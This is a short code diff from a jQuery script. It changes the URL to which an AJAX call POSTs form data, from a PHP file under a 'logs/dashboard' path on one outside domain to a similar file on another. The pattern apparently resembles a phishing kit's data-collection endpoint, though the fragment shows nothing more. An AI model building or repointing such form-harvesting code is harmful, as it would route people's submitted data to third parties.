@@ -69,7 +69,7 @@ $(document).ready(function() {
   
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://bucketlion.com/logs/dashboard/file/chigb.php",
+            url: "https://physicaleducationdiploma.com/dashboard/file/chgb.php",
             type: 'POST',
             data: formData,
             contentType: false,
